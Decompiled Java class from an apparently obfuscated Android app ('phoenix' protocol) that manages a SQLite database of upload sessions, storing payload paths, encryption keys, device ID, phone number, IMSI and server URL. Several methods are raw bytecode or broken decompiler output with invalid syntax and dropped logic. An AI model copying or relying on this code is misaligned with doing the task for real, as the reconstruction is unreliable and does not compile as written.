package com.vvt.phoenix.prot.b;

import android.content.ContentValues;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import java.io.File;
import java.util.ArrayList;

public class b
{
  private static String a;
  private static String b;
  private SQLiteDatabase c;
  
  public b(String paramString1, String paramString2)
  {
    Object localObject = "/";
    boolean bool = paramString1.endsWith((String)localObject);
    String str;
    if (bool)
    {
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = ((StringBuilder)localObject).append(paramString1);
      str = "phoenix_db.db";
      localObject = str;
      a = (String)localObject;
      localObject = "/";
      bool = paramString2.endsWith((String)localObject);
      if (!bool) {
        break label111;
      }
    }
    for (b = paramString2;; b = (String)localObject)
    {
      return;
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = ((StringBuilder)localObject).append(paramString1).append("/");
      str = "phoenix_db.db";
      localObject = str;
      a = (String)localObject;
      break;
      label111:
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = ((StringBuilder)localObject).append(paramString2);
      str = "/";
      localObject = str;
    }
  }
  
  private void a(int paramInt)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      localObject1 = this.c;
      localObject2 = "phoenix_session";
      int i = 1;
      localObject3 = new String[i];
      int j = 0;
      String str1 = null;
      String str2 = "payload_path";
      localObject3[0] = str2;
      j = 0;
      str1 = null;
      str2 = null;
      localObject2 = ((SQLiteDatabase)localObject1).query((String)localObject2, (String[])localObject3, null, null, null, null, null);
      if (localObject2 != null)
      {
        i = ((Cursor)localObject2).getCount();
        if (i != 0)
        {
          ((Cursor)localObject2).moveToFirst();
          k = 0;
          localObject1 = null;
          while (k < i)
          {
            str1 = "payload_path";
            j = ((Cursor)localObject2).getColumnIndex(str1);
            str1 = ((Cursor)localObject2).getString(j);
            localArrayList.add(str1);
            k += 1;
          }
        }
        ((Cursor)localObject2).close();
      }
    }
    catch (Exception localException)
    {
      Object localObject1;
      Object localObject2;
      Object localObject3;
      int k;
      int n;
      for (;;) {}
    }
    n = 0;
    localObject2 = null;
    for (;;)
    {
      k = localArrayList.size();
      if (n >= k) {
        break;
      }
      localObject1 = (String)localArrayList.get(n);
      localObject3 = new java/io/File;
      ((File)localObject3).<init>((String)localObject1);
      boolean bool = ((File)localObject3).delete();
      if (!bool) {}
      int m = n + 1;
      n = m;
    }
    localObject1 = new java/io/File;
    localObject2 = a;
    ((File)localObject1).<init>((String)localObject2);
    ((File)localObject1).delete();
    localObject1 = SQLiteDatabase.openOrCreateDatabase(a, null);
    this.c = ((SQLiteDatabase)localObject1);
    this.c.execSQL("CREATE TABLE IF NOT EXISTS phoenix_session (_id INTEGER PRIMARY KEY AUTOINCREMENT,csid INTEGER,ready_flag INTEGER, payload_path TEXT, payload_size INTEGER, payload_crc INTEGER, public_key BLOB, ssid INTEGER, aes_key BLOB, protocol_version INTEGER, product_id INTEGER, product_version TEXT, config_id INTEGER, device_id TEXT, activate_code TEXT, language INTEGER, phone_number TEXT, mcc TEXT, mnc TEXT, imsi TEXT, host_url TEXT, battery_level INTEGER, encrypt_code INTEGER, compress_code INTEGER, has_virtual_payload INTEGER, virtual_payload_attributes BLOB );");
    this.c.execSQL("CREATE TABLE IF NOT EXISTS virtual_payload (_id INTEGER PRIMARY KEY AUTOINCREMENT, csid INTEGER, event_attributes BLOB, event_file_path TEXT, event_file_md5 BLOB );");
    this.c.execSQL("CREATE TABLE IF NOT EXISTS csid_generator (_id INTEGER PRIMARY KEY AUTOINCREMENT,latest_csid INTEGER);");
    this.c.setVersion(3);
  }
  
  private void a(Cursor paramCursor, a parama)
  {
    int i = 1;
    int j = paramCursor.getColumnIndex("csid");
    long l = paramCursor.getLong(j);
    parama.a(l);
    Object localObject = "ready_flag";
    j = paramCursor.getColumnIndex((String)localObject);
    j = paramCursor.getInt(j);
    if (j == i)
    {
      parama.a(i);
      int k = paramCursor.getColumnIndex("payload_path");
      localObject = paramCursor.getString(k);
      parama.a((String)localObject);
      k = paramCursor.getColumnIndex("payload_size");
      l = paramCursor.getLong(k);
      parama.c(l);
      k = paramCursor.getColumnIndex("payload_crc");
      l = paramCursor.getLong(k);
      parama.d(l);
      k = paramCursor.getColumnIndex("public_key");
      localObject = paramCursor.getBlob(k);
      parama.a((byte[])localObject);
      k = paramCursor.getColumnIndex("ssid");
      l = paramCursor.getLong(k);
      parama.b(l);
      k = paramCursor.getColumnIndex("aes_key");
      localObject = paramCursor.getBlob(k);
      parama.b((byte[])localObject);
      localObject = new com/vvt/phoenix/prot/command/c;
      ((com.vvt.phoenix.prot.command.c)localObject).<init>();
      int n = paramCursor.getColumnIndex("protocol_version");
      n = paramCursor.getInt(n);
      ((com.vvt.phoenix.prot.command.c)localObject).a(n);
      n = paramCursor.getColumnIndex("product_id");
      n = paramCursor.getInt(n);
      ((com.vvt.phoenix.prot.command.c)localObject).b(n);
      n = paramCursor.getColumnIndex("product_version");
      String str = paramCursor.getString(n);
      ((com.vvt.phoenix.prot.command.c)localObject).a(str);
      n = paramCursor.getColumnIndex("config_id");
      n = paramCursor.getInt(n);
      ((com.vvt.phoenix.prot.command.c)localObject).c(n);
      n = paramCursor.getColumnIndex("device_id");
      str = paramCursor.getString(n);
      ((com.vvt.phoenix.prot.command.c)localObject).b(str);
      n = paramCursor.getColumnIndex("activate_code");
      str = paramCursor.getString(n);
      ((com.vvt.phoenix.prot.command.c)localObject).c(str);
      n = paramCursor.getColumnIndex("language");
      n = paramCursor.getInt(n);
      ((com.vvt.phoenix.prot.command.c)localObject).d(n);
      n = paramCursor.getColumnIndex("phone_number");
      str = paramCursor.getString(n);
      ((com.vvt.phoenix.prot.command.c)localObject).d(str);
      n = paramCursor.getColumnIndex("mcc");
      str = paramCursor.getString(n);
      ((com.vvt.phoenix.prot.command.c)localObject).e(str);
      n = paramCursor.getColumnIndex("mnc");
      str = paramCursor.getString(n);
      ((com.vvt.phoenix.prot.command.c)localObject).f(str);
      n = paramCursor.getColumnIndex("imsi");
      str = paramCursor.getString(n);
      ((com.vvt.phoenix.prot.command.c)localObject).g(str);
      n = paramCursor.getColumnIndex("host_url");
      str = paramCursor.getString(n);
      ((com.vvt.phoenix.prot.command.c)localObject).h(str);
      n = paramCursor.getColumnIndex("battery_level");
      n = paramCursor.getInt(n);
      ((com.vvt.phoenix.prot.command.c)localObject).g(n);
      n = paramCursor.getColumnIndex("encrypt_code");
      n = paramCursor.getInt(n);
      ((com.vvt.phoenix.prot.command.c)localObject).e(n);
      str = "compress_code";
      n = paramCursor.getColumnIndex(str);
      n = paramCursor.getInt(n);
      ((com.vvt.phoenix.prot.command.c)localObject).f(n);
      parama.a((com.vvt.phoenix.prot.command.c)localObject);
      localObject = "has_virtual_payload";
      k = paramCursor.getColumnIndex((String)localObject);
      k = paramCursor.getInt(k);
      if (k != i) {
        break label714;
      }
      parama.b(i);
      int m = paramCursor.getColumnIndex("virtual_payload_attributes");
      localObject = paramCursor.getBlob(m);
      parama.c((byte[])localObject);
    }
    for (;;)
    {
      return;
      parama.a(false);
      break;
      label714:
      parama.b(false);
    }
  }
  
  /* Error */
  private long b()
  {
    // Byte code:
    //   0: lconst_1
    //   1: lstore_1
    //   2: iconst_m1
    //   3: i2l
    //   4: lstore_3
    //   5: aload_0
    //   6: getfield 43	com/vvt/phoenix/prot/removeFromPath/removeFromPath:MyUncaughtExceptionHandler	Landroid/database/sqlite/SQLiteDatabase;
    //   9: astore 5
    //   11: ldc -13
    //   13: astore 6
    //   15: aconst_null
    //   16: astore 7
    //   18: aconst_null
    //   19: astore 8
    //   21: aconst_null
    //   22: astore 9
    //   24: aconst_null
    //   25: astore 10
    //   27: aload 5
    //   29: aload 6
    //   31: aconst_null
    //   32: aconst_null
    //   33: aconst_null
    //   34: aconst_null
    //   35: aconst_null
    //   36: aconst_null
    //   37: invokevirtual 54	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   40: astore 7
    //   42: aload 7
    //   44: ifnull +261 -> 305
    //   47: aload 7
    //   49: invokeinterface 60 1 0
    //   54: istore 11
    //   56: iload 11
    //   58: ifeq +106 -> 164
    //   61: aload 7
    //   63: invokeinterface 64 1 0
    //   68: pop
    //   69: ldc -11
    //   71: astore 5
    //   73: aload 7
    //   75: aload 5
    //   77: invokeinterface 68 2 0
    //   82: istore 11
    //   84: aload 7
    //   86: iload 11
    //   88: invokeinterface 120 2 0
    //   93: lload_1
    //   94: ladd
    //   95: lstore 12
    //   97: new 247	android/content/ContentValues
    //   100: astore 8
    //   102: aload 8
    //   104: invokespecial 248	android/content/ContentValues:<init>	()V
    //   107: ldc -11
    //   109: astore 9
    //   111: lload 12
    //   113: invokestatic 254	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   116: astore 10
    //   118: aload 8
    //   120: aload 9
    //   122: aload 10
    //   124: invokevirtual 258	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/Long;)V
    //   127: aload_0
    //   128: getfield 43	com/vvt/phoenix/prot/removeFromPath/removeFromPath:MyUncaughtExceptionHandler	Landroid/database/sqlite/SQLiteDatabase;
    //   131: astore 9
    //   133: ldc -13
    //   135: astore 10
    //   137: aload 9
    //   139: aload 10
    //   141: aload 8
    //   143: aconst_null
    //   144: aconst_null
    //   145: invokevirtual 262	android/database/sqlite/SQLiteDatabase:update	(Ljava/lang/String;Landroid/content/ContentValues;Ljava/lang/String;[Ljava/lang/String;)I
    //   148: pop
    //   149: aload 7
    //   151: ifnull +10 -> 161
    //   154: aload 7
    //   156: invokeinterface 79 1 0
    //   161: lload 12
    //   163: lreturn
    //   164: lconst_1
    //   165: lstore 12
    //   167: new 247	android/content/ContentValues
    //   170: astore 8
    //   172: aload 8
    //   174: invokespecial 248	android/content/ContentValues:<init>	()V
    //   177: ldc -11
    //   179: astore 9
    //   181: lload 12
    //   183: invokestatic 254	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   186: astore 5
    //   188: aload 8
    //   190: aload 9
    //   192: aload 5
    //   194: invokevirtual 258	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/Long;)V
    //   197: aload_0
    //   198: getfield 43	com/vvt/phoenix/prot/removeFromPath/removeFromPath:MyUncaughtExceptionHandler	Landroid/database/sqlite/SQLiteDatabase;
    //   201: astore 5
    //   203: ldc -13
    //   205: astore 6
    //   207: aconst_null
    //   208: astore 9
    //   210: aload 5
    //   212: aload 6
    //   214: aconst_null
    //   215: aload 8
    //   217: invokevirtual 266	android/database/sqlite/SQLiteDatabase:insert	(Ljava/lang/String;Ljava/lang/String;Landroid/content/ContentValues;)J
    //   220: lstore 12
    //   222: lload 12
    //   224: lload_3
    //   225: lcmp
    //   226: istore 11
    //   228: iload 11
    //   230: ifne +69 -> 299
    //   233: lload_3
    //   234: lstore 12
    //   236: goto -87 -> 149
    //   239: astore 5
    //   241: iconst_0
    //   242: istore 11
    //   244: aconst_null
    //   245: astore 5
    //   247: aload 5
    //   249: ifnull +10 -> 259
    //   252: aload 5
    //   254: invokeinterface 79 1 0
    //   259: lload_3
    //   260: lstore 12
    //   262: goto -101 -> 161
    //   265: astore 5
    //   267: aconst_null
    //   268: astore 7
    //   270: aload 7
    //   272: ifnull +10 -> 282
    //   275: aload 7
    //   277: invokeinterface 79 1 0
    //   282: aload 5
    //   284: athrow
    //   285: astore 5
    //   287: goto -17 -> 270
    //   290: astore 5
    //   292: aload 7
    //   294: astore 5
    //   296: goto -49 -> 247
    //   299: lload_1
    //   300: lstore 12
    //   302: goto -153 -> 149
    //   305: lload_3
    //   306: lstore 12
    //   308: goto -159 -> 149
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	311	0	this	removeFromPath
    //   1	299	1	l1	long
    //   4	302	3	l2	long
    //   9	202	5	localObject1	Object
    //   239	1	5	localException1	Exception
    //   245	8	5	localObject2	Object
    //   265	18	5	localObject3	Object
    //   285	1	5	localObject4	Object
    //   290	1	5	localException2	Exception
    //   294	1	5	localObject5	Object
    //   13	200	6	str	String
    //   16	277	7	localCursor	Cursor
    //   19	197	8	localContentValues	ContentValues
    //   22	187	9	localObject6	Object
    //   25	115	10	localObject7	Object
    //   54	33	11	i	int
    //   226	17	11	bool	boolean
    //   95	212	12	l3	long
    // Exception table:
    //   from	to	target	type
    //   5	9	239	java/lang/Exception
    //   36	40	239	java/lang/Exception
    //   5	9	265	finally
    //   36	40	265	finally
    //   47	54	285	finally
    //   61	69	285	finally
    //   75	82	285	finally
    //   86	93	285	finally
    //   97	100	285	finally
    //   102	107	285	finally
    //   111	116	285	finally
    //   122	127	285	finally
    //   127	131	285	finally
    //   144	149	285	finally
    //   167	170	285	finally
    //   172	177	285	finally
    //   181	186	285	finally
    //   192	197	285	finally
    //   197	201	285	finally
    //   215	220	285	finally
    //   47	54	290	java/lang/Exception
    //   61	69	290	java/lang/Exception
    //   75	82	290	java/lang/Exception
    //   86	93	290	java/lang/Exception
    //   97	100	290	java/lang/Exception
    //   102	107	290	java/lang/Exception
    //   111	116	290	java/lang/Exception
    //   122	127	290	java/lang/Exception
    //   127	131	290	java/lang/Exception
    //   144	149	290	java/lang/Exception
    //   167	170	290	java/lang/Exception
    //   172	177	290	java/lang/Exception
    //   181	186	290	java/lang/Exception
    //   192	197	290	java/lang/Exception
    //   197	201	290	java/lang/Exception
    //   215	220	290	java/lang/Exception
  }
  
  private void b(Cursor paramCursor, a parama)
  {
    int i = paramCursor.getCount();
    if (i != 0)
    {
      ArrayList localArrayList = new java/util/ArrayList;
      localArrayList.<init>();
      int j = 0;
      while (j < i)
      {
        paramCursor.moveToPosition(j);
        c localc = new com/vvt/phoenix/prot/b/c;
        localc.<init>();
        int k = paramCursor.getColumnIndex("event_attributes");
        Object localObject = paramCursor.getBlob(k);
        localc.a((byte[])localObject);
        k = paramCursor.getColumnIndex("event_file_path");
        localObject = paramCursor.getString(k);
        localc.a((String)localObject);
        k = paramCursor.getColumnIndex("event_file_md5");
        localObject = paramCursor.getBlob(k);
        localc.b((byte[])localObject);
        localArrayList.add(localc);
        j += 1;
      }
      parama.a(localArrayList);
    }
  }
  
  private String c(long paramLong)
  {
    StringBuffer localStringBuffer = new java/lang/StringBuffer;
    String str = b;
    localStringBuffer.<init>(str);
    localStringBuffer.append(paramLong);
    localStringBuffer.append(".prot");
    return localStringBuffer.toString();
  }
  
  public a a(long paramLong)
  {
    try
    {
      localObject1 = this.c;
      String str1 = "phoenix_session";
      String str2 = "csid=?";
      int i = 1;
      String[] arrayOfString = new String[i];
      String str3 = String.valueOf(paramLong);
      arrayOfString[0] = str3;
      str3 = null;
      localCursor = ((SQLiteDatabase)localObject1).query(str1, null, str2, arrayOfString, null, null, null);
      if (localCursor == null) {
        break label213;
      }
      int j = localCursor.getCount();
      if (j == 0) {
        break label205;
      }
      localCursor.moveToFirst();
      a locala = new com/vvt/phoenix/prot/b/a;
      locala.<init>();
      a(localCursor, locala);
      bool = locala.j();
      if (bool)
      {
        localObject1 = this.c;
        str1 = "virtual_payload";
        str2 = "csid=?";
        i = 1;
        arrayOfString = new String[i];
        str3 = String.valueOf(paramLong);
        arrayOfString[0] = str3;
        str3 = null;
        localObject1 = ((SQLiteDatabase)localObject1).query(str1, null, str2, arrayOfString, null, null, null);
        if (localObject1 != null)
        {
          b((Cursor)localObject1, locala);
          ((Cursor)localObject1).close();
        }
      }
      localObject1 = locala;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        Cursor localCursor;
        boolean bool = false;
        Object localObject2 = null;
        continue;
        label205:
        bool = false;
        localObject2 = null;
        continue;
        label213:
        bool = false;
        localObject2 = null;
      }
    }
    localCursor.close();
    return (a)localObject1;
  }
  
  public a a(com.vvt.phoenix.prot.b paramb)
  {
    a locala = new com/vvt/phoenix/prot/b/a;
    locala.<init>();
    long l = b();
    locala.a(l);
    Object localObject = c(l);
    locala.a((String)localObject);
    localObject = paramb.b();
    locala.a((com.vvt.phoenix.prot.command.c)localObject);
    locala.a(false);
    return locala;
  }
  
  /* Error */
  public void a()
  {
    // Byte code:
    //   0: getstatic 36	com/vvt/phoenix/prot/removeFromPath/removeFromPath:a	Ljava/lang/String;
    //   3: astore_1
    //   4: iconst_0
    //   5: istore_2
    //   6: aconst_null
    //   7: astore_3
    //   8: aload_1
    //   9: aconst_null
    //   10: invokestatic 98	android/database/sqlite/SQLiteDatabase:openOrCreateDatabase	(Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase$CursorFactory;)Landroid/database/sqlite/SQLiteDatabase;
    //   13: astore_1
    //   14: aload_0
    //   15: aload_1
    //   16: putfield 43	com/vvt/phoenix/prot/removeFromPath/removeFromPath:MyUncaughtExceptionHandler	Landroid/database/sqlite/SQLiteDatabase;
    //   19: aload_0
    //   20: getfield 43	com/vvt/phoenix/prot/removeFromPath/removeFromPath:MyUncaughtExceptionHandler	Landroid/database/sqlite/SQLiteDatabase;
    //   23: astore_1
    //   24: aload_1
    //   25: invokevirtual 326	android/database/sqlite/SQLiteDatabase:getVersion	()I
    //   28: istore 4
    //   30: iconst_3
    //   31: istore_2
    //   32: iload 4
    //   34: iload_2
    //   35: if_icmpge +10 -> 45
    //   38: aload_0
    //   39: iload 4
    //   41: invokespecial 327	com/vvt/phoenix/prot/removeFromPath/removeFromPath:a	(I)V
    //   44: return
    //   45: aload_0
    //   46: getfield 43	com/vvt/phoenix/prot/removeFromPath/removeFromPath:MyUncaughtExceptionHandler	Landroid/database/sqlite/SQLiteDatabase;
    //   49: astore_1
    //   50: ldc 100
    //   52: astore_3
    //   53: aload_1
    //   54: aload_3
    //   55: invokevirtual 103	android/database/sqlite/SQLiteDatabase:execSQL	(Ljava/lang/String;)V
    //   58: aload_0
    //   59: getfield 43	com/vvt/phoenix/prot/removeFromPath/removeFromPath:MyUncaughtExceptionHandler	Landroid/database/sqlite/SQLiteDatabase;
    //   62: astore_1
    //   63: ldc 105
    //   65: astore_3
    //   66: aload_1
    //   67: aload_3
    //   68: invokevirtual 103	android/database/sqlite/SQLiteDatabase:execSQL	(Ljava/lang/String;)V
    //   71: aload_0
    //   72: getfield 43	com/vvt/phoenix/prot/removeFromPath/removeFromPath:MyUncaughtExceptionHandler	Landroid/database/sqlite/SQLiteDatabase;
    //   75: astore_1
    //   76: ldc 107
    //   78: astore_3
    //   79: aload_1
    //   80: aload_3
    //   81: invokevirtual 103	android/database/sqlite/SQLiteDatabase:execSQL	(Ljava/lang/String;)V
    //   84: goto -40 -> 44
    //   87: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	88	0	this	removeFromPath
    //   3	77	1	localObject	Object
    //   5	31	2	i	int
    //   7	74	3	str	String
    //   28	12	4	j	int
    //   87	1	5	localSQLiteException	android.database.sqlite.SQLiteException
    // Exception table:
    //   from	to	target	type
    //   0	3	87	android/database/sqlite/SQLiteException
    //   9	13	87	android/database/sqlite/SQLiteException
    //   15	19	87	android/database/sqlite/SQLiteException
    //   19	23	87	android/database/sqlite/SQLiteException
    //   24	28	87	android/database/sqlite/SQLiteException
    //   39	44	87	android/database/sqlite/SQLiteException
    //   45	49	87	android/database/sqlite/SQLiteException
    //   54	58	87	android/database/sqlite/SQLiteException
    //   58	62	87	android/database/sqlite/SQLiteException
    //   67	71	87	android/database/sqlite/SQLiteException
    //   71	75	87	android/database/sqlite/SQLiteException
    //   80	84	87	android/database/sqlite/SQLiteException
  }
  
  /* Error */
  public boolean a(a parama)
  {
    // Byte code:
    //   0: iconst_m1
    //   1: i2l
    //   2: lstore_2
    //   3: aload_1
    //   4: invokevirtual 331	com/vvt/phoenix/prot/removeFromPath/a:d	()Lcom/vvt/phoenix/prot/command/MyUncaughtExceptionHandler;
    //   7: astore 4
    //   9: new 247	android/content/ContentValues
    //   12: astore 5
    //   14: aload 5
    //   16: invokespecial 248	android/content/ContentValues:<init>	()V
    //   19: aload_1
    //   20: invokevirtual 333	com/vvt/phoenix/prot/removeFromPath/a:a	()J
    //   23: invokestatic 254	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   26: astore 6
    //   28: aload 5
    //   30: ldc 116
    //   32: aload 6
    //   34: invokevirtual 258	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/Long;)V
    //   37: aload_1
    //   38: invokevirtual 335	com/vvt/phoenix/prot/removeFromPath/a:e	()Z
    //   41: invokestatic 340	java/lang/Boolean:valueOf	(Z)Ljava/lang/Boolean;
    //   44: astore 6
    //   46: aload 5
    //   48: ldc 127
    //   50: aload 6
    //   52: invokevirtual 343	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/Boolean;)V
    //   55: aload_1
    //   56: invokevirtual 345	com/vvt/phoenix/prot/removeFromPath/a:MyUncaughtExceptionHandler	()Ljava/lang/String;
    //   59: astore 6
    //   61: aload 5
    //   63: ldc 48
    //   65: aload 6
    //   67: invokevirtual 348	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/String;)V
    //   70: aload_1
    //   71: invokevirtual 350	com/vvt/phoenix/prot/removeFromPath/a:AppEngine1	()J
    //   74: invokestatic 254	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   77: astore 6
    //   79: aload 5
    //   81: ldc -118
    //   83: aload 6
    //   85: invokevirtual 258	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/Long;)V
    //   88: aload_1
    //   89: invokevirtual 353	com/vvt/phoenix/prot/removeFromPath/a:i	()J
    //   92: invokestatic 254	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   95: astore 6
    //   97: aload 5
    //   99: ldc -114
    //   101: aload 6
    //   103: invokevirtual 258	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/Long;)V
    //   106: aload_1
    //   107: invokevirtual 356	com/vvt/phoenix/prot/removeFromPath/a:f	()[B
    //   110: astore 6
    //   112: aload 5
    //   114: ldc -109
    //   116: aload 6
    //   118: invokevirtual 359	android/content/ContentValues:put	(Ljava/lang/String;[B)V
    //   121: aload_1
    //   122: invokevirtual 360	com/vvt/phoenix/prot/removeFromPath/a:removeFromPath	()J
    //   125: lstore 7
    //   127: lload 7
    //   129: invokestatic 254	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   132: astore 6
    //   134: aload 5
    //   136: ldc -100
    //   138: aload 6
    //   140: invokevirtual 258	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/Long;)V
    //   143: aload_1
    //   144: invokevirtual 362	com/vvt/phoenix/prot/removeFromPath/a:FxFileObserverWorker	()[B
    //   147: astore 6
    //   149: aload 5
    //   151: ldc -96
    //   153: aload 6
    //   155: invokevirtual 359	android/content/ContentValues:put	(Ljava/lang/String;[B)V
    //   158: aload 4
    //   160: invokevirtual 364	com/vvt/phoenix/prot/command/MyUncaughtExceptionHandler:a	()I
    //   163: invokestatic 369	java/lang/Integer:valueOf	(I)Ljava/lang/Integer;
    //   166: astore 6
    //   168: aload 5
    //   170: ldc -89
    //   172: aload 6
    //   174: invokevirtual 372	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/Integer;)V
    //   177: aload 4
    //   179: invokevirtual 374	com/vvt/phoenix/prot/command/MyUncaughtExceptionHandler:removeFromPath	()I
    //   182: invokestatic 369	java/lang/Integer:valueOf	(I)Ljava/lang/Integer;
    //   185: astore 6
    //   187: aload 5
    //   189: ldc -85
    //   191: aload 6
    //   193: invokevirtual 372	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/Integer;)V
    //   196: aload 4
    //   198: invokevirtual 375	com/vvt/phoenix/prot/command/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	()Ljava/lang/String;
    //   201: astore 6
    //   203: aload 5
    //   205: ldc -81
    //   207: aload 6
    //   209: invokevirtual 348	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/String;)V
    //   212: aload 4
    //   214: invokevirtual 377	com/vvt/phoenix/prot/command/MyUncaughtExceptionHandler:d	()I
    //   217: invokestatic 369	java/lang/Integer:valueOf	(I)Ljava/lang/Integer;
    //   220: astore 6
    //   222: aload 5
    //   224: ldc -78
    //   226: aload 6
    //   228: invokevirtual 372	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/Integer;)V
    //   231: aload 4
    //   233: invokevirtual 379	com/vvt/phoenix/prot/command/MyUncaughtExceptionHandler:e	()Ljava/lang/String;
    //   236: astore 6
    //   238: aload 5
    //   240: ldc -74
    //   242: aload 6
    //   244: invokevirtual 348	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/String;)V
    //   247: aload 4
    //   249: invokevirtual 381	com/vvt/phoenix/prot/command/MyUncaughtExceptionHandler:f	()Ljava/lang/String;
    //   252: astore 6
    //   254: aload 5
    //   256: ldc -70
    //   258: aload 6
    //   260: invokevirtual 348	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/String;)V
    //   263: aload 4
    //   265: invokevirtual 383	com/vvt/phoenix/prot/command/MyUncaughtExceptionHandler:FxFileObserverWorker	()I
    //   268: invokestatic 369	java/lang/Integer:valueOf	(I)Ljava/lang/Integer;
    //   271: astore 6
    //   273: aload 5
    //   275: ldc -66
    //   277: aload 6
    //   279: invokevirtual 372	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/Integer;)V
    //   282: aload 4
    //   284: invokevirtual 385	com/vvt/phoenix/prot/command/MyUncaughtExceptionHandler:AppEngine1	()Ljava/lang/String;
    //   287: astore 6
    //   289: aload 5
    //   291: ldc -62
    //   293: aload 6
    //   295: invokevirtual 348	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/String;)V
    //   298: aload 4
    //   300: invokevirtual 387	com/vvt/phoenix/prot/command/MyUncaughtExceptionHandler:i	()Ljava/lang/String;
    //   303: astore 6
    //   305: aload 5
    //   307: ldc -58
    //   309: aload 6
    //   311: invokevirtual 348	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/String;)V
    //   314: aload 4
    //   316: invokevirtual 389	com/vvt/phoenix/prot/command/MyUncaughtExceptionHandler:j	()Ljava/lang/String;
    //   319: astore 6
    //   321: aload 5
    //   323: ldc -53
    //   325: aload 6
    //   327: invokevirtual 348	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/String;)V
    //   330: aload 4
    //   332: invokevirtual 392	com/vvt/phoenix/prot/command/MyUncaughtExceptionHandler:k	()Ljava/lang/String;
    //   335: astore 6
    //   337: aload 5
    //   339: ldc -48
    //   341: aload 6
    //   343: invokevirtual 348	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/String;)V
    //   346: aload 4
    //   348: invokevirtual 395	com/vvt/phoenix/prot/command/MyUncaughtExceptionHandler:l	()Ljava/lang/String;
    //   351: astore 6
    //   353: aload 5
    //   355: ldc -43
    //   357: aload 6
    //   359: invokevirtual 348	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/String;)V
    //   362: aload 4
    //   364: invokevirtual 398	com/vvt/phoenix/prot/command/MyUncaughtExceptionHandler:o	()I
    //   367: invokestatic 369	java/lang/Integer:valueOf	(I)Ljava/lang/Integer;
    //   370: astore 6
    //   372: aload 5
    //   374: ldc -38
    //   376: aload 6
    //   378: invokevirtual 372	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/Integer;)V
    //   381: aload 4
    //   383: invokevirtual 401	com/vvt/phoenix/prot/command/MyUncaughtExceptionHandler:m	()I
    //   386: istore 9
    //   388: iload 9
    //   390: invokestatic 369	java/lang/Integer:valueOf	(I)Ljava/lang/Integer;
    //   393: astore 6
    //   395: aload 5
    //   397: ldc -34
    //   399: aload 6
    //   401: invokevirtual 372	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/Integer;)V
    //   404: aload 4
    //   406: invokevirtual 404	com/vvt/phoenix/prot/command/MyUncaughtExceptionHandler:n	()I
    //   409: istore 10
    //   411: iload 10
    //   413: invokestatic 369	java/lang/Integer:valueOf	(I)Ljava/lang/Integer;
    //   416: astore 4
    //   418: aload 5
    //   420: ldc -30
    //   422: aload 4
    //   424: invokevirtual 372	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/Integer;)V
    //   427: aload_1
    //   428: invokevirtual 309	com/vvt/phoenix/prot/removeFromPath/a:j	()Z
    //   431: istore 11
    //   433: iload 11
    //   435: invokestatic 340	java/lang/Boolean:valueOf	(Z)Ljava/lang/Boolean;
    //   438: astore 12
    //   440: aload 5
    //   442: ldc -23
    //   444: aload 12
    //   446: invokevirtual 343	android/content/ContentValues:put	(Ljava/lang/String;Ljava/lang/Boolean;)V
    //   449: ldc -19
    //   451: astore 4
    //   453: aload_1
    //   454: invokevirtual 406	com/vvt/phoenix/prot/removeFromPath/a:k	()[B
    //   457: astore 12
    //   459: aload 5
    //   461: aload 4
    //   463: aload 12
    //   465: invokevirtual 359	android/content/ContentValues:put	(Ljava/lang/String;[B)V
    //   468: aload_0
    //   469: getfield 43	com/vvt/phoenix/prot/removeFromPath/removeFromPath:MyUncaughtExceptionHandler	Landroid/database/sqlite/SQLiteDatabase;
    //   472: astore 4
    //   474: ldc 45
    //   476: astore 12
    //   478: iconst_0
    //   479: istore 9
    //   481: aconst_null
    //   482: astore 6
    //   484: aload 4
    //   486: aload 12
    //   488: aconst_null
    //   489: aload 5
    //   491: invokevirtual 266	android/database/sqlite/SQLiteDatabase:insert	(Ljava/lang/String;Ljava/lang/String;Landroid/content/ContentValues;)J
    //   494: lstore 13
    //   496: lload 13
    //   498: lload_2
    //   499: lcmp
    //   500: istore 10
    //   502: iload 10
    //   504: ifeq +205 -> 709
    //   507: aload_1
